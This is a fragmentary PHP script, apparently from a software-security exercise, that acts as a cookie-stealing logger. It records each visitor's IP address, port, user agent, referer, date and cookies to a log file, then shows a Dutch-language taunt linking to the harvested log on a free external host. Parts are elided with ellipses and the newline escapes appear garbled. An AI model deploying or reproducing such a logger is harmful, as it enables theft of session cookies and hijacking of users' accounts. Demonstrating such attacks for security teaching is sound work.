...
{ 
    ...
    if (preg_match("/bhtmb/i", $ipLog) || preg_match("/bhtmlb/i", $ipLog)) 
        ...
        fputs($log, "IP: $ip | PORT: $rem_port | Agent: $user_agent | REF: $referer |  DATE: $date | COOKIE:  $cookie nn"); 
    fclose($log); 
} 
logData(); 
?>
<html>
    <a href="https://silke-henderickx-software-security.000webhostapp.com/log.txt"> Ik heb je cookies! Klik hier om te zien wat ik te pakken heb gekregen.</a>
